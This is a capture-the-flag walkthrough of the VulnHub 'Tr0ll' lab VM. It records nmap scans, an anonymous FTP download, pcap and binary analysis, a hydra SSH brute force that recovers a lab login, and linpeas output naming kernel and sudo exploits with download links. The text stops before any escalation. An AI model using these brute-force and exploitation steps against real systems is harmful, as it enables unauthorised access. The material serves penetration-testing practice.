# vulnhub Tr0ll

```
┌──(kali㉿kali)-[~]
└─$ sudo nmap -O -T5 192.168.0.16
Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-19 07:36 EDT
Nmap scan report for 192.168.0.16
Host is up (0.00049s latency).
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
MAC Address: 00:0C:29:48:5D:28 (VMware)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop

OS detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1.71 seconds
```

```
┌──(kali㉿kali)-[~]
└─$ nmap -sV -sC -p- -T5 192.168.0.16
Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-19 07:39 EDT
Nmap scan report for 192.168.0.16
Host is up (0.00047s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.2
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rwxrwxrwx    1 1000     0            8068 Aug 10  2014 lol.pcap [NSE: writeable]
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 192.168.0.30
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 600
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.2 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 d6:18:d9:ef:75:d3:1c:29:be:14:b5:2b:18:54:a9:c0 (DSA)
|   2048 ee:8c:64:87:44:39:53:8c:24:fe:9d:39:a9:ad:ea:db (RSA)
|   256 0e:66:e6:50:cf:56:3b:9c:67:8b:5f:56:ca:ae:6b:f4 (ECDSA)
|_  256 b2:8b:e2:46:5c:ef:fd:dc:72:f7:10:7e:04:5f:25:85 (ED25519)
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/secret
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.7 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.91 seconds

```

## ftp 

```
┌──(kali㉿kali)-[/tmp]
└─$ ftp 192.168.0.16
Connected to 192.168.0.16.
220 (vsFTPd 3.0.2)
Name (192.168.0.16:kali): Anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||16770|).
150 Here comes the directory listing.
-rwxrwxrwx    1 1000     0            8068 Aug 10  2014 lol.pcap
226 Directory send OK.
ftp> get lol.pcap
local: lol.pcap remote: lol.pcap
229 Entering Extended Passive Mode (|||31137|).
150 Opening BINARY mode data connection for lol.pcap (8068 bytes).
100% |****************************************************************************************|  8068        1.87 MiB/s    00:00 ETA
226 Transfer complete.
8068 bytes received in 00:00 (1.64 MiB/s)
ftp> bye
221 Goodbye.

```
## lol.pcap 
```
┌──(kali㉿kali)-[/tmp]
└─$ tcpdump -r lol.pcap 
reading from file lol.pcap, link-type EN10MB (Ethernet), snapshot length 65535
03:39:51.351067 IP 10.0.0.12.52449 > 10.0.0.6.ftp: Flags [S], seq 1647052769, win 29200, options [mss 1460,sackOK,TS val 380917 ecr 0,nop,wscale 10], length 0
03:39:51.351396 IP 10.0.0.6.ftp > 10.0.0.12.52449: Flags [S.], seq 2675281184, ack 1647052770, win 28960, options [mss 1460,sackOK,TS val 1749793 ecr 380917,nop,wscale 5], length 0
03:39:51.351412 IP 10.0.0.12.52449 > 10.0.0.6.ftp: Flags [.], ack 1, win 29, options [nop,nop,TS val 380917 ecr 1749793], length 0
03:39:51.352827 IP 10.0.0.6.ftp > 10.0.0.12.52449: Flags [P.], seq 1:21, ack 1, win 905, options [nop,nop,TS val 1749794 ecr 380917], length 20: FTP: 220 (vsFTPd 3.0.2)
03:39:51.352878 IP 10.0.0.12.52449 > 10.0.0.6.ftp: Flags [.], ack 21, win 29, options [nop,nop,TS val 380918 ecr 1749794], length 0
03:39:55.245863 IP 10.0.0.12.52449 > 10.0.0.6.ftp: Flags [P.], seq 1:17, ack 21, win 29, options [nop,nop,TS val 381891 ecr 1749794], length 16: FTP: USER anonymous
03:39:55.246179 IP 10.0.0.6.ftp > 10.0.0.12.52449: Flags [.], ack 17, win 905, options [nop,nop,TS val 1750767 ecr 381891], length 0
03:39:55.246239 IP 10.0.0.6.ftp > 10.0.0.12.52449: Flags [P.], seq 21:55, ack 17, win 905, options [nop,nop,TS val 1750767 ecr 381891], length 34: FTP: 331 Please specify the password.
03:39:55.246276 IP 10.0.0.12.52449 > 10.0.0.6.ftp: Flags [.], ack 55, win 29, options [nop,nop,TS val 381891 ecr 1750767], length 0
03:39:58.373724 IP 10.0.0.12.52449 > 10.0.0.6.ftp: Flags [P.], seq 17:32, ack 55, win 29, options [nop,nop,TS val 382673 ecr 1750767], length 15: FTP: PASS password
03:39:58.374894 IP 10.0.0.6.ftp > 10.0.0.12.52449: Flags [P.], seq 55:78, ack 32, win 905, options [nop,nop,TS val 1751549 ecr 382673], length 23: FTP: 230 Login successful.
03:39:58.374946 IP 10.0.0.12.52449 > 10.0.0.6.ftp: Flags [.], ack 78, win 29, options [nop,nop,TS val 382673 ecr 1751549], length 0
03:39:58.375027 IP 10.0.0.12.52449 > 10.0.0.6.ftp: Flags [P.], seq 32:38, ack 78, win 29, options [nop,nop,TS val 382673 ecr 1751549], length 6: FTP: SYST
03:39:58.377293 IP 10.0.0.6.ftp > 10.0.0.12.52449: Flags [P.], seq 78:97, ack 38, win 905, options [nop,nop,TS val 1751549 ecr 382673], length 19: FTP: 215 UNIX Type: L8
03:39:58.417894 IP 10.0.0.12.52449 > 10.0.0.6.ftp: Flags [.], ack 97, win 29, options [nop,nop,TS val 382684 ecr 1751549], length 0
03:40:01.166014 IP 10.0.0.12.52449 > 10.0.0.6.ftp: Flags [P.], seq 38:62, ack 97, win 29, options [nop,nop,TS val 383371 ecr 1751549], length 24: FTP: PORT 10,0,0,12,173,198
03:40:01.166394 IP 10.0.0.6.ftp > 10.0.0.12.52449: Flags [P.], seq 97:148, ack 62, win 905, options [nop,nop,TS val 1752247 ecr 383371], length 51: FTP: 200 PORT command successful. Consider using PASV.
03:40:01.166441 IP 10.0.0.12.52449 > 10.0.0.6.ftp: Flags [.], ack 148, win 29, options [nop,nop,TS val 383371 ecr 1752247], length 0
03:40:01.166517 IP 10.0.0.12.52449 > 10.0.0.6.ftp: Flags [P.], seq 62:68, ack 148, win 29, options [nop,nop,TS val 383371 ecr 1752247], length 6: FTP: LIST
03:40:01.166759 IP 10.0.0.6.ftp-data > 10.0.0.12.44486: Flags [S], seq 974037252, win 29200, options [mss 1460,sackOK,TS val 1752247 ecr 0,nop,wscale 5], length 0
03:40:01.166774 IP 10.0.0.12.44486 > 10.0.0.6.ftp-data: Flags [S.], seq 84804754, ack 974037253, win 28960, options [mss 1460,sackOK,TS val 383371 ecr 1752247,nop,wscale 10], length 0
03:40:01.166893 IP 10.0.0.6.ftp-data > 10.0.0.12.44486: Flags [.], ack 1, win 913, options [nop,nop,TS val 1752247 ecr 383371], length 0
03:40:01.167035 IP 10.0.0.6.ftp > 10.0.0.12.52449: Flags [P.], seq 148:187, ack 68, win 905, options [nop,nop,TS val 1752247 ecr 383371], length 39: FTP: 150 Here comes the directory listing.
03:40:01.167189 IP 10.0.0.6.ftp-data > 10.0.0.12.44486: Flags [P.], seq 1:75, ack 1, win 913, options [nop,nop,TS val 1752247 ecr 383371], length 74
03:40:01.167193 IP 10.0.0.6.ftp-data > 10.0.0.12.44486: Flags [F.], seq 75, ack 1, win 913, options [nop,nop,TS val 1752247 ecr 383371], length 0
03:40:01.167232 IP 10.0.0.12.44486 > 10.0.0.6.ftp-data: Flags [.], ack 75, win 29, options [nop,nop,TS val 383371 ecr 1752247], length 0
03:40:01.167306 IP 10.0.0.12.44486 > 10.0.0.6.ftp-data: Flags [F.], seq 1, ack 76, win 29, options [nop,nop,TS val 383371 ecr 1752247], length 0
03:40:01.167441 IP 10.0.0.6.ftp-data > 10.0.0.12.44486: Flags [.], ack 2, win 913, options [nop,nop,TS val 1752247 ecr 383371], length 0
03:40:01.167510 IP 10.0.0.6.ftp > 10.0.0.12.52449: Flags [P.], seq 187:211, ack 68, win 905, options [nop,nop,TS val 1752247 ecr 383371], length 24: FTP: 226 Directory send OK.
03:40:01.167541 IP 10.0.0.12.52449 > 10.0.0.6.ftp: Flags [.], ack 211, win 29, options [nop,nop,TS val 383371 ecr 1752247], length 0
03:40:09.149519 IP 10.0.0.12.52449 > 10.0.0.6.ftp: Flags [P.], seq 68:76, ack 211, win 29, options [nop,nop,TS val 385367 ecr 1752247], length 8: FTP: TYPE I
03:40:09.149886 IP 10.0.0.6.ftp > 10.0.0.12.52449: Flags [P.], seq 211:242, ack 76, win 905, options [nop,nop,TS val 1754243 ecr 385367], length 31: FTP: 200 Switching to Binary mode.
03:40:09.149951 IP 10.0.0.12.52449 > 10.0.0.6.ftp: Flags [P.], seq 76:100, ack 242, win 29, options [nop,nop,TS val 385367 ecr 1754243], length 24: FTP: PORT 10,0,0,12,202,172
03:40:09.150167 IP 10.0.0.6.ftp > 10.0.0.12.52449: Flags [P.], seq 242:293, ack 100, win 905, options [nop,nop,TS val 1754243 ecr 385367], length 51: FTP: 200 PORT command successful. Consider using PASV.
03:40:09.150221 IP 10.0.0.12.52449 > 10.0.0.6.ftp: Flags [P.], seq 100:123, ack 293, win 29, options [nop,nop,TS val 385367 ecr 1754243], length 23: FTP: RETR secret_stuff.txt
03:40:09.150503 IP 10.0.0.6.ftp-data > 10.0.0.12.51884: Flags [S], seq 1166248810, win 29200, options [mss 1460,sackOK,TS val 1754243 ecr 0,nop,wscale 5], length 0
03:40:09.150516 IP 10.0.0.12.51884 > 10.0.0.6.ftp-data: Flags [S.], seq 1208732501, ack 1166248811, win 28960, options [mss 1460,sackOK,TS val 385367 ecr 1754243,nop,wscale 10], length 0
03:40:09.150657 IP 10.0.0.6.ftp-data > 10.0.0.12.51884: Flags [.], ack 1, win 913, options [nop,nop,TS val 1754243 ecr 385367], length 0
03:40:09.150802 IP 10.0.0.6.ftp > 10.0.0.12.52449: Flags [P.], seq 293:368, ack 123, win 905, options [nop,nop,TS val 1754243 ecr 385367], length 75: FTP: 150 Opening BINARY mode data connection for secret_stuff.txt (147 bytes).
03:40:09.150863 IP 10.0.0.6.ftp-data > 10.0.0.12.51884: Flags [P.], seq 1:148, ack 1, win 913, options [nop,nop,TS val 1754243 ecr 385367], length 147
03:40:09.150868 IP 10.0.0.12.51884 > 10.0.0.6.ftp-data: Flags [.], ack 148, win 30, options [nop,nop,TS val 385367 ecr 1754243], length 0
03:40:09.150939 IP 10.0.0.6.ftp-data > 10.0.0.12.51884: Flags [F.], seq 148, ack 1, win 913, options [nop,nop,TS val 1754243 ecr 385367], length 0
03:40:09.151217 IP 10.0.0.12.51884 > 10.0.0.6.ftp-data: Flags [F.], seq 1, ack 149, win 30, options [nop,nop,TS val 385367 ecr 1754243], length 0
03:40:09.151382 IP 10.0.0.6.ftp-data > 10.0.0.12.51884: Flags [.], ack 2, win 913, options [nop,nop,TS val 1754243 ecr 385367], length 0
03:40:09.151618 IP 10.0.0.6.ftp > 10.0.0.12.52449: Flags [P.], seq 368:392, ack 123, win 905, options [nop,nop,TS val 1754243 ecr 385367], length 24: FTP: 226 Transfer complete.
03:40:09.151652 IP 10.0.0.12.52449 > 10.0.0.6.ftp: Flags [.], ack 392, win 29, options [nop,nop,TS val 385367 ecr 1754243], length 0
03:40:11.165614 IP 10.0.0.12.52449 > 10.0.0.6.ftp: Flags [P.], seq 123:131, ack 392, win 29, options [nop,nop,TS val 385871 ecr 1754243], length 8: FTP: TYPE A
03:40:11.165939 IP 10.0.0.6.ftp > 10.0.0.12.52449: Flags [P.], seq 392:422, ack 131, win 905, options [nop,nop,TS val 1754747 ecr 385871], length 30: FTP: 200 Switching to ASCII mode.
03:40:11.166003 IP 10.0.0.12.52449 > 10.0.0.6.ftp: Flags [P.], seq 131:154, ack 422, win 29, options [nop,nop,TS val 385871 ecr 1754747], length 23: FTP: PORT 10,0,0,12,172,74
03:40:11.166217 IP 10.0.0.6.ftp > 10.0.0.12.52449: Flags [P.], seq 422:473, ack 154, win 905, options [nop,nop,TS val 1754747 ecr 385871], length 51: FTP: 200 PORT command successful. Consider using PASV.
03:40:11.166272 IP 10.0.0.12.52449 > 10.0.0.6.ftp: Flags [P.], seq 154:160, ack 473, win 29, options [nop,nop,TS val 385871 ecr 1754747], length 6: FTP: LIST
03:40:11.166551 IP 10.0.0.6.ftp-data > 10.0.0.12.44106: Flags [S], seq 2345686726, win 29200, options [mss 1460,sackOK,TS val 1754747 ecr 0,nop,wscale 5], length 0
03:40:11.166564 IP 10.0.0.12.44106 > 10.0.0.6.ftp-data: Flags [S.], seq 2201358367, ack 2345686727, win 28960, options [mss 1460,sackOK,TS val 385871 ecr 1754747,nop,wscale 10], length 0
03:40:11.166682 IP 10.0.0.6.ftp-data > 10.0.0.12.44106: Flags [.], ack 1, win 913, options [nop,nop,TS val 1754747 ecr 385871], length 0
03:40:11.166915 IP 10.0.0.6.ftp > 10.0.0.12.52449: Flags [P.], seq 473:512, ack 160, win 905, options [nop,nop,TS val 1754747 ecr 385871], length 39: FTP: 150 Here comes the directory listing.
03:40:11.166919 IP 10.0.0.6.ftp-data > 10.0.0.12.44106: Flags [P.], seq 1:75, ack 1, win 913, options [nop,nop,TS val 1754747 ecr 385871], length 74
03:40:11.166923 IP 10.0.0.12.44106 > 10.0.0.6.ftp-data: Flags [.], ack 75, win 29, options [nop,nop,TS val 385871 ecr 1754747], length 0
03:40:11.166940 IP 10.0.0.6.ftp-data > 10.0.0.12.44106: Flags [F.], seq 75, ack 1, win 913, options [nop,nop,TS val 1754747 ecr 385871], length 0
03:40:11.167060 IP 10.0.0.12.44106 > 10.0.0.6.ftp-data: Flags [F.], seq 1, ack 76, win 29, options [nop,nop,TS val 385871 ecr 1754747], length 0
03:40:11.168908 IP 10.0.0.6.ftp-data > 10.0.0.12.44106: Flags [.], ack 2, win 913, options [nop,nop,TS val 1754747 ecr 385871], length 0
03:40:11.168915 IP 10.0.0.6.ftp > 10.0.0.12.52449: Flags [P.], seq 512:536, ack 160, win 905, options [nop,nop,TS val 1754747 ecr 385871], length 24: FTP: 226 Directory send OK.
03:40:11.168952 IP 10.0.0.12.52449 > 10.0.0.6.ftp: Flags [.], ack 536, win 29, options [nop,nop,TS val 385872 ecr 1754747], length 0
03:40:31.045246 IP 10.0.0.12.52449 > 10.0.0.6.ftp: Flags [P.], seq 160:166, ack 536, win 29, options [nop,nop,TS val 390841 ecr 1754747], length 6: FTP: QUIT
03:40:31.045582 IP 10.0.0.6.ftp > 10.0.0.12.52449: Flags [P.], seq 536:550, ack 166, win 905, options [nop,nop,TS val 1759717 ecr 390841], length 14: FTP: 221 Goodbye.
03:40:31.045589 IP 10.0.0.6.ftp > 10.0.0.12.52449: Flags [F.], seq 550, ack 166, win 905, options [nop,nop,TS val 1759717 ecr 390841], length 0
03:40:31.045734 IP 10.0.0.12.52449 > 10.0.0.6.ftp: Flags [F.], seq 166, ack 551, win 29, options [nop,nop,TS val 390841 ecr 1759717], length 0
03:40:31.045887 IP 10.0.0.6.ftp > 10.0.0.12.52449: Flags [.], ack 167, win 905, options [nop,nop,TS val 1759717 ecr 390841], length 0
```

## wireshark lol.pcap
```
Frame 40: 213 bytes on wire (1704 bits), 213 bytes captured (1704 bits) on interface eth0, id 0
Ethernet II, Src: VMware_20:70:99 (00:0c:29:20:70:99), Dst: VMware_5d:04:92 (00:0c:29:5d:04:92)
Internet Protocol Version 4, Src: 10.0.0.6, Dst: 10.0.0.12
Transmission Control Protocol, Src Port: 20, Dst Port: 51884, Seq: 1, Ack: 1, Len: 147
FTP Data (147 bytes data)
[Setup frame: 33]
[Setup method: PORT]
[Command: RETR secret_stuff.txt]
Command frame: 35
[Current working directory: ]
Line-based text data (3 lines)
    Well, well, well, aren't you just a clever little devil, you almost found the sup3rs3cr3tdirlol :-P\n
    \n
    Sucks, you were so close... gotta TRY HARDER!\n

```

## http://192.168.0.16/sup3rs3cr3tdirlol/ --> roflmao

### roflmao
```
┌──(root💀kali)-[/home/kali/Downloads]
└─# cat roflmao      
ELF 4L4         (44  TT▒��hhhDDP�td���,,Q�tdR��/lib/ld-linux.so.2GNU▒GNU^B�Y���I��Y���O  �K��▒3 !
                                                                                                libc.so.6_IO_stdin_usedprintf__libc_stB��_main__gmon_start__GLIBC_2.0ii
  S�����C��������t�.�[��5��%
                            h������%������%h�����1�^�����PTRh�h@QVh������f�f�f�f�f�f�f��$�f�f�f�f�f�f��#- ��wø��t�U����▒�$ ���Í�� - ���������uú��t�U����▒�D$�$ ���É���'�= uU����|���� ���f����t���tU����▒�$����y�����s���U��������$�������f�f�f�f�f�f�UW1�VS�����õ��l$0��
                                                                                                                                   ������������������S��������C[�Find address 0x0856BF to proceed(����D)���hL���������zR|
                                                                                   ����F
                                                                                        J
S�                                                                                       tx?▒;*2$"@�����B
  8`����a�A
           �C�A�N0HA�A�
                       AA�������Ѓ
▒�                              ��
 ���o��
L
 ▒���ot���o���oh�GCC: (Ubuntu 4.8.2-19ubuntu1) 4.8.2.symtab.strtab.shstrtab.interp.note.ABI-tag.note.gnu.build-id.gnu.hash.dynsym.dynstr.gnu.version.gnu.version_r.rel.dyn.rel.plt.init.text.fini.rodata.eh_frame_hdr.eh_frame.init_array.fini_array.jcr.dynamic.got.got.plt.data.bss.commentT#hh 1��$D���o�� N
                                  �PVL^���ohh
k���ott z       ��      ��▒
                          ���#���@�  ������)���,�  ��
                                                    �
                                                    ������▒�▒  �0 $D�0- ,▒TTh�h��       ��
��
 ��
����
  �▒▒ ▒��
W f      `�
���������
 ( ▒4 N����▒▒� �▒��@a
        crtstuff.c__JCR_LIST__deregister_tm_clonesregister_tm_clones__do_global_dtors_auxcompleted.6590__do_global_dtors_aux_fini_array_entryframe_dummy__frame_dummy_init_array_entryroflmao.c__FRAME_END____JCR_END____init_array_end_DYNAMIC__init_array_start_GLOBAL_OFFSET_TABLE___libc_csu_fini_ITM_deregisterTMCloneTable__x86.get_pc_thunk.bxdata_startprintf@@GLIBC_2.0_edata_fini__data_start__gmon_start____dso_handle_IO_stdin_used__libc_start_main@@GLIBC_2.0__libc_csu_init_end_start_fp_hw__bss_startmain_Jv_RegisterClasses__TMC_END___ITM_registerTMCloneTable_init 
```

```
┌──(root💀kali)-[/home/kali/Downloads]
└─# strings roflmao          
/lib/ld-linux.so.2
libc.so.6
_IO_stdin_used
printf
__libc_start_main
__gmon_start__
GLIBC_2.0
PTRh
[^_]
Find address 0x0856BF to proceed
;*2$"
GCC: (Ubuntu 4.8.2-19ubuntu1) 4.8.2
.symtab
.strtab
.shstrtab
.interp
.note.ABI-tag
.note.gnu.build-id
.gnu.hash
.dynsym
.dynstr
.gnu.version
.gnu.version_r
.rel.dyn
.rel.plt
.init
.text
.fini
.rodata
.eh_frame_hdr
.eh_frame
.init_array
.fini_array
.jcr
.dynamic
.got
.got.plt
.data
.bss
.comment
crtstuff.c
__JCR_LIST__
deregister_tm_clones
register_tm_clones
__do_global_dtors_aux
completed.6590
__do_global_dtors_aux_fini_array_entry
frame_dummy
__frame_dummy_init_array_entry
roflmao.c
__FRAME_END__
__JCR_END__
__init_array_end
_DYNAMIC
__init_array_start
_GLOBAL_OFFSET_TABLE_
__libc_csu_fini
_ITM_deregisterTMCloneTable
__x86.get_pc_thunk.bx
data_start
printf@@GLIBC_2.0
_edata
_fini
__data_start
__gmon_start__
__dso_handle
_IO_stdin_used
__libc_start_main@@GLIBC_2.0
__libc_csu_init
_end
_start
_fp_hw
__bss_start
main
_Jv_RegisterClasses
__TMC_END__
_ITM_registerTMCloneTable
_init

```

```
┌──(root💀kali)-[/home/kali/Downloads]
└─# file roflmao 
roflmao: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GN.6.24, BuildID[sha1]=5e14420eaa59e599c2f508490483d959f3d2cf4f, not stripped

┌──(root💀kali)-[/home/kali/Downloads]
└─# ./roflmao       
Find address 0x0856BF to proceed  
```
## http://192.168.0.16/0x0856BF/ -> get which_one_lol.txt & pass.txt
```
┌──(root💀kali)-[/tmp]
└─# cat user.txt                                                                                                        127 ⨯
maleus
ps-aux
felux
Eagle11
genphlux
genphlux < -- Definitely not this one
usmc8892
blawrg
wytshadow
vis1t0r
overflow
                                                                                                                             
┌──(root💀kali)-[/tmp]
└─# cat pass.txt
Pass.txt
pass.txt
Pass
pass
Good_job_:)

``` 

## hydra ssh
```
┌──(root💀kali)-[/tmp]
└─# hydra -L user.txt -P pass.txt -t 64 192.168.0.16 ssh                                                      
Hydra v9.2 (c) 2021 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-04-19 08:57:18
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[VERBOSE] More tasks defined than login/pass pairs exist. Tasks reduced to 55
[DATA] max 55 tasks per 1 server, overall 55 tasks, 55 login tries (l:11/p:5), ~1 try per task
[DATA] attacking ssh://192.168.0.16:22/
[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
[INFO] Testing if password authentication is supported by ssh://maleus@192.168.0.16:22
[INFO] Successful, password authentication is supported by ssh://192.168.0.16:22

[22][ssh] host: 192.168.0.16   login: overflow   password: Pass.txt
[STATUS] attack finished for 192.168.0.16 (waiting for children to complete tests)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-04-19 08:57:23

```

```
$ ./linpeas.sh 



    /---------------------------------------------------------------------------\
    |                             Do you like PEASS?                            |                                            
    |---------------------------------------------------------------------------|                                            
    |         Get latest LinPEAS  :     https://github.com/sponsors/carlospolop |                                            
    |         Follow on Twitter   :     @carlospolopm                           |                                            
    |         Respect on HTB      :     SirBroccoli                             |                                            
    |---------------------------------------------------------------------------|                                            
    |                                 Thank you!                                |                                            
    \---------------------------------------------------------------------------/                                            
          linpeas-ng by carlospolop                                                                                          
                                                                                                                             
ADVISORY: This script should be used for authorized penetration testing and/or educational purposes only. Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own computers and/or with the computer owner's permission.                                                                                             
                                                                                                                             
Linux Privesc Checklist: https://book.hacktricks.xyz/linux-unix/linux-privilege-escalation-checklist
 LEGEND:                                                                                                                     
  RED/YELLOW: 95% a PE vector
  RED: You should take a look to it
  LightCyan: Users with console
  Blue: Users without console & mounted devs
  Green: Common things (users, groups, SUID/SGID, mounts, .sh scripts, cronjobs) 
  LightMagenta: Your username

 Starting linpeas. Caching Writable Folders...

                                         ╔═══════════════════╗
═════════════════════════════════════════╣ Basic information ╠═════════════════════════════════════════                      
                                         ╚═══════════════════╝                                                               
OS: Linux version 3.13.0-32-generic (buildd@roseapple) (gcc version 4.8.2 (Ubuntu 4.8.2-19ubuntu1) ) #57-Ubuntu SMP Tue Jul 15 03:51:12 UTC 2014
User & Groups: uid=1002(overflow) gid=1002(overflow) groups=1002(overflow)
Hostname: troll
Writable folder: /run/shm
[+] /bin/ping is available for network discovery (linpeas can discover hosts, learn more with -h)
[+] /bin/nc is available for network discover & port scanning (linpeas can discover hosts and scan ports, learn more with -h)
                                                                                                                             

Caching directories . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . DONE
                                                                                                                             
                                        ╔════════════════════╗
════════════════════════════════════════╣ System Information ╠════════════════════════════════════════                       
                                        ╚════════════════════╝                                                               
╔══════════╣ Operative system
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#kernel-exploits                                                
Linux version 3.13.0-32-generic (buildd@roseapple) (gcc version 4.8.2 (Ubuntu 4.8.2-19ubuntu1) ) #57-Ubuntu SMP Tue Jul 15 03:51:12 UTC 2014
Distributor ID: Ubuntu
Description:    Ubuntu 14.04.1 LTS
Release:        14.04
Codename:       trusty

╔══════════╣ Sudo version
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-version                                                   
Sudo version 1.8.9p5                                                                                                         

╔══════════╣ CVEs Check
./linpeas.sh: 1191: ./linpeas.sh: systemctl: not found                                                                       
./linpeas.sh: 1192: ./linpeas.sh: [[: not found
./linpeas.sh: 1192: ./linpeas.sh: rpm: not found
./linpeas.sh: 1192: ./linpeas.sh: 0: not found
./linpeas.sh: 1202: ./linpeas.sh: [[: not found


╔══════════╣ PATH
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-path-abuses                                           
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games                                     
New path exported: /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games

╔══════════╣ Date & uptime
Tue Apr 19 06:08:06 PDT 2022                                                                                                 
 06:08:06 up  1:45,  1 user,  load average: 0.08, 0.03, 0.07

╔══════════╣ Any sd*/disk* disk in /dev? (limit 20)
disk                                                                                                                         
sda
sda1
sda2
sda5

╔══════════╣ Unmounted file-system?
╚ Check if you can mount unmounted devices                                                                                   
UUID=5ea1589a-303f-445d-b778-1f26a563bba1 /               ext4    errors=remount-ro 0       1                                
UUID=7b2fd829-c355-4e27-abc7-cc46bbda1f1e none            swap    sw              0       0
/dev/fd0        /media/floppy0  auto    rw,user,noauto,exec,utf8 0       0

╔══════════╣ Environment
╚ Any private information inside environment variables?                                                                      
HISTFILESIZE=0                                                                                                               
MAIL=/var/mail/overflow
USER=overflow
SSH_CLIENT=192.168.0.30 50420 22
LANGUAGE=en_US:
HOME=/home/overflow
OLDPWD=/
SSH_TTY=/dev/pts/0
LOGNAME=overflow
TERM=xterm-256color
XDG_SESSION_ID=5
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
XDG_RUNTIME_DIR=/run/user/1002
LANG=en_US.UTF-8
HISTSIZE=0
SHELL=/bin/sh
PWD=/tmp
SSH_CONNECTION=192.168.0.30 50420 192.168.0.16 22
HISTFILE=/dev/null

╔══════════╣ Searching Signature verification failed in dmesg
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#dmesg-signature-verification-failed                            
dmesg Not Found                                                                                                              
                                                                                                                             
╔══════════╣ Executing Linux Exploit Suggester
╚ https://github.com/mzet-/linux-exploit-suggester                                                                           
[+] [CVE-2016-5195] dirtycow                                                                                                 

   Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails
   Exposure: highly probable
   Tags: debian=7|8,RHEL=5{kernel:2.6.(18|24|33)-*},RHEL=6{kernel:2.6.32-*|3.(0|2|6|8|10).*|2.6.33.9-rt31},RHEL=7{kernel:3.10.0-*|4.2.0-0.21.el7},[ ubuntu=16.04|14.04|12.04 ]
   Download URL: https://www.exploit-db.com/download/40611
   Comments: For RHEL/CentOS see exact vulnerable versions here: https://access.redhat.com/sites/default/files/rh-cve-2016-5195_5.sh

[+] [CVE-2016-5195] dirtycow 2

   Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails
   Exposure: highly probable
   Tags: debian=7|8,RHEL=5|6|7,[ ubuntu=14.04|12.04 ],ubuntu=10.04{kernel:2.6.32-21-generic},ubuntu=16.04{kernel:4.4.0-21-generic}
   Download URL: https://www.exploit-db.com/download/40839
   ext-url: https://www.exploit-db.com/download/40847
   Comments: For RHEL/CentOS see exact vulnerable versions here: https://access.redhat.com/sites/default/files/rh-cve-2016-5195_5.sh

[+] [CVE-2015-1328] overlayfs

   Details: http://seclists.org/oss-sec/2015/q2/717
   Exposure: highly probable
   Tags: [ ubuntu=(12.04|14.04){kernel:3.13.0-(2|3|4|5)*-generic} ],ubuntu=(14.10|15.04){kernel:3.(13|16).0-*-generic}
   Download URL: https://www.exploit-db.com/download/37292

[+] [CVE-2021-3156] sudo Baron Samedit 2

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: probable
   Tags: centos=6|7|8,[ ubuntu=14|16|17|18|19|20 ], debian=9|10
   Download URL: https://codeload.github.com/worawit/CVE-2021-3156/zip/main

[+] [CVE-2017-6074] dccp

   Details: http://www.openwall.com/lists/oss-security/2017/02/22/3
   Exposure: probable
   Tags: [ ubuntu=(14.04|16.04) ]{kernel:4.4.0-62-generic}
   Download URL: https://www.exploit-db.com/download/41458
   Comments: Requires Kernel be built with CONFIG_IP_DCCP enabled. Includes partial SMEP/SMAP bypass

[+] [CVE-2016-2384] usb-midi

   Details: https://xairy.github.io/blog/2016/cve-2016-2384
   Exposure: probable
   Tags: [ ubuntu=14.04 ],fedora=22
   Download URL: https://raw.githubusercontent.com/xairy/kernel-exploits/master/CVE-2016-2384/poc.c
   Comments: Requires ability to plug in a malicious USB device and to execute a malicious binary as a non-privileged user

[+] [CVE-2015-8660] overlayfs (ovl_setattr)

   Details: http://www.halfdog.net/Security/2015/UserNamespaceOverlayfsSetuidWriteExec/
   Exposure: probable
